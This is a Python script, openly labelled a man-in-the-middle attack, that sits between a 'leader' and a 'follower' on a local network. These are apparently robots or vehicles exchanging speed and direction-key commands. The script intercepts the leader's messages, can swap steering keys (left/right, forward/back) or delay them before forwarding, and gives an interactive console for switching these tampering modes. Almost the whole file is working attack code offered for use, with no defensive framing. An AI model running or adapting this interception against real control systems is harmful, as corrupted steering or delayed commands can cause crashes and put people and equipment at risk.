import socket
import threading
import time

class MITMAttack:
    def __init__(self, leader_host='192.168.1.34', leader_port=12345, 
                 follower_host='192.168.1.30', follower_port=12345):
        # Set up the server socket (pretending to be the leader)
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((leader_host, leader_port))
        self.server_socket.listen(1)
        
        # Set up the client socket (to connect to the real leader)
        self.leader_host = leader_host
        self.leader_port = leader_port + 1  # Use a different port for the real leader
        
        # Set up the client socket (to connect to the follower)
        self.follower_host = follower_host
        self.follower_port = follower_port
        
        # Data manipulation flags
        self.modify_data = False
        self.delay_data = False
        self.delay_time = 1.0  # Default delay in seconds
        
        # Communication log
        self.log = []
        
    def start(self):
        print("Starting MITM attack...")
        print("1. Start the real leader on port", self.leader_port)
        print("2. Make sure follower is configured to connect to this MITM")
        
        try:
            # Connect to the real leader
            self.leader_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.leader_socket.connect((self.leader_host, self.leader_port))
            print("Connected to the real leader")
            
            # Wait for follower to connect
            print("Waiting for follower to connect...")
            self.follower_conn, addr = self.server_socket.accept()
            print(f"Follower connected from {addr}")
            
            # Start intercepting
            self.interceptor_thread = threading.Thread(target=self.intercept_data)
            self.interceptor_thread.daemon = True
            self.interceptor_thread.start()
            
            # Start command interface
            self.command_interface()
            
        except Exception as e:
            print(f"Error: {e}")
        finally:
            self.cleanup()
    
    def intercept_data(self):
        try:
            while True:
                # Receive data from the real leader
                data = self.leader_socket.recv(1024)
                if not data:
                    break
                
                # Decode the received data
                decoded_data = data.decode('utf-8')
                leader_speed, key = decoded_data.split(',')
                
                # Log the original data
                log_entry = {"timestamp": time.time(), "original": decoded_data}
                
                # Apply modifications if enabled
                if self.modify_data:
                    # Example modification: Reverse directions
                    if key == 'a':
                        key = 'd'
                    elif key == 'd':
                        key = 'a'
                    elif key == 'w':
                        key = 's'
                    elif key == 's':
                        key = 'w'
                    
                    modified_data = f"{leader_speed},{key}"
                    log_entry["modified"] = modified_data
                    data = modified_data.encode('utf-8')
                    print(f"Modified: {decoded_data} -> {modified_data}")
                else:
                    print(f"Passing through: {decoded_data}")
                
                # Apply delay if enabled
                if self.delay_data:
                    print(f"Delaying transmission by {self.delay_time} seconds...")
                    time.sleep(self.delay_time)
                
                # Forward data to the follower
                self.follower_conn.sendall(data)
                
                # Add to log
                self.log.append(log_entry)
                
        except Exception as e:
            print(f"Interception error: {e}")
    
    def command_interface(self):
        print("\n--- MITM Control Interface ---")
        print("Commands:")
        print("  toggle_modify - Toggle data modification")
        print("  toggle_delay - Toggle transmission delay")
        print("  set_delay [seconds] - Set delay time")
        print("  status - Show current status")
        print("  log - Show communication log")
        print("  exit - Exit the program")
        
        while True:
            cmd = input("\nEnter command: ").strip()
            
            if cmd == "toggle_modify":
                self.modify_data = not self.modify_data
                print(f"Data modification: {'ON' if self.modify_data else 'OFF'}")
            
            elif cmd == "toggle_delay":
                self.delay_data = not self.delay_data
                print(f"Transmission delay: {'ON' if self.delay_data else 'OFF'}")
            
            elif cmd.startswith("set_delay"):
                try:
                    self.delay_time = float(cmd.split()[1])
                    print(f"Delay time set to {self.delay_time} seconds")
                except:
                    print("Invalid delay time. Usage: set_delay [seconds]")
            
            elif cmd == "status":
                print(f"Data modification: {'ON' if self.modify_data else 'OFF'}")
                print(f"Transmission delay: {'ON' if self.delay_data else 'OFF'}")
                print(f"Delay time: {self.delay_time} seconds")
            
            elif cmd == "log":
                if not self.log:
                    print("No communication logged yet")
                else:
                    for i, entry in enumerate(self.log[-10:]):  # Show last 10 entries
                        print(f"[{i}] Original: {entry['original']}")
                        if 'modified' in entry:
                            print(f"    Modified: {entry['modified']}")
            
            elif cmd == "exit":
                print("Exiting...")
                break
            
            else:
                print("Unknown command")
    
    def cleanup(self):
        print("Cleaning up...")
        try:
            self.leader_socket.close()
            self.follower_conn.close()
            self.server_socket.close()
        except:
            pass
        print("MITM attack stopped")

if __name__ == "__main__":
    # Create and start the MITM attack
    mitm = MITMAttack()
    mitm.start()